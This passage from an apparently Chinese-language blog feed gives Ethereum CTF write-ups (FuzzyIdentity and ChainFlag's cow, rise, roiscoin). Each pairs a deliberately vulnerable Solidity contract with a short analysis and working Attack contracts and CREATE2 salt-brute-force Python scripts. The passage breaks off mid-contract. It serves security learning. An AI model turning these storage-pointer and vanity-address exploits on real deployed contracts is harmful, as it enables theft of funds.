class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface IName &#123;</span><br><span class="line">    function name() external view returns (bytes32);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FuzzyIdentityChallenge &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(isSmarx(msg.sender));</span><br><span class="line">        require(isBadCode(msg.sender));</span><br><span class="line"></span><br><span class="line">        isComplete = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSmarx(address addr) internal view returns (bool) &#123;</span><br><span class="line">        return IName(addr).name() == bytes32(&quot;smarx&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isBadCode(address _addr) internal pure returns (bool) &#123;</span><br><span class="line">        bytes20 addr = bytes20(_addr);</span><br><span class="line">        bytes20 id = hex&quot;000000000000000000000000000000000badc0de&quot;;</span><br><span class="line">        bytes20 mask = hex&quot;000000000000000000000000000000000fffffff&quot;;</span><br><span class="line"></span><br><span class="line">        for (uint256 i = 0; i &lt; 34; i++) &#123;</span><br><span class="line">            if (addr &amp; mask == id) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            mask &lt;&lt;= 4;</span><br><span class="line">            id &lt;&lt;= 4;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse-1"><a href="#Analyse-1" class="headerlink" title="Analyse"></a>Analyse</h2><p>需要通过isBadCode才可以完成合约，isBadCode要求地址中任意位置出现0badc0de即可，因此我们需呀用creat2方法来寻找地址</p><h2 id="Attack-1"><a href="#Attack-1" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">    function name() external view returns (bytes32)&#123;</span><br><span class="line">        return bytes32(&quot;smarx&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Deploy&#123;</span><br><span class="line"></span><br><span class="line">    function getBytecode()public pure returns(bytes memory)&#123;</span><br><span class="line">        bytes memory bytecode=type(Attack).creationCode;</span><br><span class="line">        return bytecode;</span><br><span class="line">    &#125;</span><br><span class="line">    function deploy(uint _salt)external returns(address addr )&#123;</span><br><span class="line">        Attack _contract=new Attack&#123;salt:bytes32(_salt)&#125;();</span><br><span class="line">        addr=address(_contract);//create2方法相对于原来的方法只需加个大括号</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后寻找s</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, HTTPProvider</span><br><span class="line"></span><br><span class="line">deployingAddr = <span class="string">&#x27;d9145CCE52D386f254917e481eB44e9943F39138&#x27;</span></span><br><span class="line"></span><br><span class="line">code = <span class="string">&#x27;0x608060405234801561000f575f80fd5b5060ce8061001c5f395ff3fe6080604052348015600e575f80fd5b50600436106026575f3560e01c806306fdde0314602a575b5f80fd5b60306044565b604051603b91906081565b60405180910390f35b5f7f736d617278000000000000000000000000000000000000000000000000000000905090565b5f819050919050565b607b81606b565b82525050565b5f60208201905060925f8301846074565b9291505056fea2646970667358221220184a43afff86c72d959a260ceda2c19ec6c6724dfd0870b2bfd2484ea098e7b664736f6c63430008140033&#x27;</span></span><br><span class="line"></span><br><span class="line">s = Web3.keccak(hexstr=code)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">a = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;%02x&#x27;</span> % b <span class="keyword">for</span> b <span class="keyword">in</span> s])</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    <span class="comment"># 去掉0x,并且补充到bytes32位</span></span><br><span class="line">    salt = <span class="built_in">hex</span>(i)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(salt)</span><br><span class="line">    p = Web3.keccak(hexstr=(<span class="string">&#x27;0xff&#x27;</span> + deployingAddr + salt + a))[<span class="number">12</span>:].<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;0badc0de&#x27;</span> <span class="keyword">in</span> p:</span><br><span class="line">        <span class="built_in">print</span>(salt, p)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ChainFlag</title>
      <link href="/2023/07/22/solidity/%E7%B2%BE%E5%8D%8E/ChainFlag/"/>
      <url>/2023/07/22/solidity/%E7%B2%BE%E5%8D%8E/ChainFlag/</url>
      
        <content type="html"><![CDATA[<h1 id="Storage"><a href="#Storage" class="headerlink" title="Storage"></a>Storage</h1><h2 id="0x01cow"><a href="#0x01cow" class="headerlink" title="0x01cow"></a>0x01cow</h2><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line">contract cow&#123;</span><br><span class="line">    address public owner_1;</span><br><span class="line">    address public owner_2;</span><br><span class="line">    address public owner_3;</span><br><span class="line">    address public owner;</span><br><span class="line">    mapping(address =&gt; uint) public balance;</span><br><span class="line"></span><br><span class="line">    struct hacker &#123;</span><br><span class="line">        address hackeraddress1;</span><br><span class="line">        address hackeraddress2;</span><br><span class="line">    &#125;</span><br><span class="line">    hacker  h;</span><br><span class="line"></span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        owner_1 = msg.sender;</span><br><span class="line">        owner_2 = msg.sender;</span><br><span class="line">        owner_3 = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event SendFlag(string b64email);</span><br><span class="line"></span><br><span class="line">    function payforflag(string memory b64email) public</span><br><span class="line">    &#123;</span><br><span class="line">        require(msg.sender==owner_1);</span><br><span class="line">        require(msg.sender==owner_2);</span><br><span class="line">        require(msg.sender==owner_3);</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">        emit SendFlag(b64email);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Cow() public payable</span><br><span class="line">    &#123;</span><br><span class="line">        uint geteth=msg.value/1000000000000000000;</span><br><span class="line">        if (geteth==1)</span><br><span class="line">        &#123;</span><br><span class="line">            owner_1=msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function cov() public payable</span><br><span class="line">    &#123;</span><br><span class="line">        uint geteth=msg.value/1000000000000000000;</span><br><span class="line">        if (geteth&lt;1)</span><br><span class="line">        &#123;</span><br><span class="line">            hacker  fff=h;</span><br><span class="line">            fff.hackeraddress1=msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            fff.hackeraddress2=msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function see() public payable</span><br><span class="line">    &#123;</span><br><span class="line">        uint geteth=msg.value/1000000000000000000;</span><br><span class="line">        balance[msg.sender]+=geteth;</span><br><span class="line">        if (uint(msg.sender) &amp; 0xffff == 0x525b)</span><br><span class="line">        &#123;</span><br><span class="line">            balance[msg.sender] -= 0xb1b1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy_own() public</span><br><span class="line">    &#123;</span><br><span class="line">        require(balance[msg.sender]&gt;1000000);</span><br><span class="line">        balance[msg.sender]=0;</span><br><span class="line">        owner_3=msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h3><p>就是通过三关就行了，第一关Cow（）转入一个代币就可以了。第二关发现else中他没有初始化结构体的指针，所以默认为slot0,slot1，因此也是转入一个代币就可以了。第三关直接creat2就可以了</p><h3 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">interface cow&#123;</span><br><span class="line">    function Cow()external payable;</span><br><span class="line">    function cov()external payable;</span><br><span class="line">    function see()external payable;</span><br><span class="line">    function buy_own()external;</span><br><span class="line">    function payforflag(string calldata b)external;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack&#123;</span><br><span class="line">    function attack(address add)public payable&#123;</span><br><span class="line">       cow target=cow(add);</span><br><span class="line">        target.Cow&#123;value:1 ether&#125;();</span><br><span class="line">        target.cov&#123;value:1 ether&#125;();</span><br><span class="line">        target.see();</span><br><span class="line">        target.buy_own();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Deploy&#123;</span><br><span class="line">    function getBytecode()public pure returns(bytes memory)&#123;</span><br><span class="line">        bytes memory bytecode=type(Attack).creationCode;</span><br><span class="line">        return bytecode;</span><br><span class="line">    &#125;</span><br><span class="line">    function deploy(uint _salt)external returns(address addr )&#123;</span><br><span class="line">        Attack _contract=new Attack&#123;salt:bytes32(_salt)&#125;();</span><br><span class="line">        addr=address(_contract);//create2方法相对于原来的方法只需加个大括号</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">from web3 import Web3, HTTPProvider</span><br><span class="line"></span><br><span class="line">deployingAddr = &#x27;aE036c65C649172b43ef7156b009c6221B596B8b&#x27;</span><br><span class="line"></span><br><span class="line">code = &#x27;0x608060405234801561000f575f80fd5b506102848061001d5f395ff3fe60806040526004361061001d575f3560e01c8063d018db3e14610021575b5f80fd5b61003b60048036038101906100369190610223565b61003d565b005b5f8190508073ffffffffffffffffffffffffffffffffffffffff1663ff2eff94670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b15801561008f575f80fd5b505af11580156100a1573d5f803e3d5ffd5b50505050508073ffffffffffffffffffffffffffffffffffffffff166396c50336670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b1580156100f4575f80fd5b505af1158015610106573d5f803e3d5ffd5b50505050508073ffffffffffffffffffffffffffffffffffffffff16639ae5a2be6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610150575f80fd5b505af1158015610162573d5f803e3d5ffd5b505050508073ffffffffffffffffffffffffffffffffffffffff1663ed6b8ff36040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156101ab575f80fd5b505af11580156101bd573d5f803e3d5ffd5b505050505050565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6101f2826101c9565b9050919050565b610202816101e8565b811461020c575f80fd5b50565b5f8135905061021d816101f9565b92915050565b5f60208284031215610238576102376101c5565b5b5f6102458482850161020f565b9150509291505056fea2646970667358221220ed8cee093c4b37532ca38f3648f878819d5e79c11c8ffaf9b374e4e1f8923a5d64736f6c63430008140033&#x27;</span><br><span class="line"></span><br><span class="line">s = Web3.keccak(hexstr=code)</span><br><span class="line">print(s)</span><br><span class="line">a = &#x27;&#x27;.join([&#x27;%02x&#x27; % b for b in s])</span><br><span class="line">print(a)</span><br><span class="line">i = 0</span><br><span class="line">while (1):</span><br><span class="line">    # 去掉0x,并且补充到bytes32位</span><br><span class="line">    salt = hex(i)[2:].rjust(64, &#x27;0&#x27;)</span><br><span class="line">    p = Web3.keccak(hexstr=(&#x27;0xff&#x27; + deployingAddr + salt + a))[12:].hex()</span><br><span class="line">    if p.endswith(&quot;525b&quot;):</span><br><span class="line">         print(salt, p)</span><br><span class="line">         break</span><br><span class="line">    i += 1</span><br><span class="line">print(int(salt,16))</span><br></pre></td></tr></table></figure><h2 id="0x02rise"><a href="#0x02rise" class="headerlink" title="0x02rise"></a>0x02rise</h2><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.2;</span><br><span class="line">contract rise &#123;</span><br><span class="line">    address referee;</span><br><span class="line">    uint secret;</span><br><span class="line">    uint bl;</span><br><span class="line">    mapping(address =&gt; uint) public balance;</span><br><span class="line">    mapping(address =&gt; uint) public gift;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    struct hacker &#123;</span><br><span class="line">        address hackeraddress;</span><br><span class="line">        uint value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        referee = msg.sender;</span><br><span class="line">        balance[msg.sender]=10000000;</span><br><span class="line">        bl=1;</span><br><span class="line">        secret=18487187377722;</span><br><span class="line">    &#125;</span><br><span class="line">    event SendFlag(string b64email);</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner()&#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyRefer()&#123;</span><br><span class="line">        require(msg.sender == referee);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function payforflag(string b64email) public</span><br><span class="line">    &#123;</span><br><span class="line">        require(balance[msg.sender]&gt;1000000);</span><br><span class="line">        balance[msg.sender]=0;</span><br><span class="line">        bl=1;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">        emit SendFlag(b64email);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function airdrop() public</span><br><span class="line">    &#123;</span><br><span class="line">        require(gift[msg.sender]==0);</span><br><span class="line">        gift[msg.sender]==1;</span><br><span class="line">        balance[msg.sender]+=1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable</span><br><span class="line">    &#123;</span><br><span class="line">        uint geteth=msg.value/1000000000000000000;</span><br><span class="line">        balance[msg.sender]+=geteth;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function set_secret(uint target_secret) public onlyOwner</span><br><span class="line">    &#123;</span><br><span class="line">        secret=target_secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function set_bl(uint target_bl) public onlyRefer</span><br><span class="line">    &#123;</span><br><span class="line">        bl=target_bl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function risegame(uint guessnumber) public payable</span><br><span class="line">    &#123;</span><br><span class="line">        require(balance[msg.sender]&gt;0);</span><br><span class="line">        uint geteth=msg.value/1000000000000000000;</span><br><span class="line">        if (guessnumber==secret)</span><br><span class="line">        &#123;</span><br><span class="line">            balance[msg.sender]+=geteth*bl;</span><br><span class="line">            bl=1;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            balance[msg.sender]=0;</span><br><span class="line">            bl=1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferto(address to) public</span><br><span class="line">    &#123;</span><br><span class="line">        require(balance[msg.sender]&gt;0);</span><br><span class="line">        if (to !=0)</span><br><span class="line">        &#123;</span><br><span class="line">            balance[to]=balance[msg.sender];</span><br><span class="line">            balance[msg.sender]=0;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            hacker storage h;</span><br><span class="line">            h.hackeraddress=msg.sender;</span><br><span class="line">            h.value=balance[msg.sender];</span><br><span class="line">            balance[msg.sender]=0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Attack-1"><a href="#Attack-1" class="headerlink" title="Attack"></a>Attack</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">interface rise &#123;</span><br><span class="line">    function airdrop() external;</span><br><span class="line">    function set_bl(uint target_bl) external;</span><br><span class="line">    function risegame(uint guessnumber) external payable;</span><br><span class="line">    function transferto(address to)external;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack&#123;</span><br><span class="line">    rise target;</span><br><span class="line">    constructor(address add)&#123;</span><br><span class="line">        target=rise(add);</span><br><span class="line">    &#125;</span><br><span class="line">    function attack()public payable&#123;</span><br><span class="line">        target.airdrop();</span><br><span class="line">        target.transferto(address(0));</span><br><span class="line">        target.airdrop();</span><br><span class="line">        target.set_bl(1000000);</span><br><span class="line">        target.risegame&#123;value:1 ether&#125;(1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03roiscoin"><a href="#0x03roiscoin" class="headerlink" title="0x03roiscoin"></a>0x03roiscoin</h2><h3 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">contract FakeOwnerGame &#123;</span><br><span class="line">    event SendFlag(address _addr);</span><br><span class="line"></span><br><span class="line">    uint randomNumber = 0;</span><br><span class="line">    uint time = now;</span><br><span class="line">    mapping (address =&gt; uint) public BalanceOf;</span><br><span class="line">    mapping (address =&gt; uint) public WinCount;</span><br><span class="line">    mapping (address =&gt; uint) public FailCount;</span><br><span class="line">    bytes32[] public codex;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public settlementBlockNumber;</span><br><span class="line">    address public guesser;</span><br><span class="line">    uint8 public guess;</span><br><span class="line"></span><br><span class="line">    struct FailedLog &#123;</span><br><span class="line">        uint failtag;</span><br><span class="line">        uint failtime;</span><br><span class="line">        uint success_count;</span><br><span class="line">        address origin;</span><br><span class="line">        uint fail_count;</span><br><span class="line">        bytes12 hash;</span><br><span class="line">        address msgsender;</span><br><span class="line">    &#125;</span><br><span class="line">    mapping(address =&gt; FailedLog[]) FailedLogs;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function payforflag() onlyOwner &#123;</span><br><span class="line">        require(BalanceOf[msg.sender] &gt;= 2000);</span><br><span class="line">        emit SendFlag(msg.sender);</span><br><span class="line">        selfdestruct(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(uint8 n) public payable &#123;</span><br><span class="line">        require(guesser == 0);</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        guesser = msg.sender;</span><br><span class="line">        guess = n;</span><br><span class="line">        settlementBlockNumber = block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender == guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 2;</span><br><span class="line"></span><br><span class="line">        if (guess == answer) &#123;</span><br><span class="line">            WinCount[msg.sender] += 1;</span><br><span class="line">            BalanceOf[msg.sender] += 1000;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            FailCount[msg.sender] += 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (WinCount[msg.sender] == 2) &#123;</span><br><span class="line">            if (WinCount[msg.sender] + FailCount[msg.sender] &lt;= 2) &#123;</span><br><span class="line">                guesser = 0;</span><br><span class="line">                WinCount[msg.sender] = 0;</span><br><span class="line">                FailCount[msg.sender] = 0;</span><br><span class="line">                msg.sender.transfer(address(this).balance);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                FailedLog failedlog;</span><br><span class="line">                failedlog.failtag = 1;</span><br><span class="line">                failedlog.failtime = now;</span><br><span class="line">                failedlog.success_count = WinCount[msg.sender];</span><br><span class="line">                failedlog.origin = tx.origin;</span><br><span class="line">                failedlog.fail_count = FailCount[msg.sender];</span><br><span class="line">                failedlog.hash = bytes12(sha3(WinCount[msg.sender] + FailCount[msg.sender]));</span><br><span class="line">                failedlog.msgsender = msg.sender;</span><br><span class="line">                FailedLogs[msg.sender].push(failedlog);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function beOwner() payable &#123;</span><br><span class="line">        require(address(this).balance &gt; 0);</span><br><span class="line">        if(msg.value &gt; 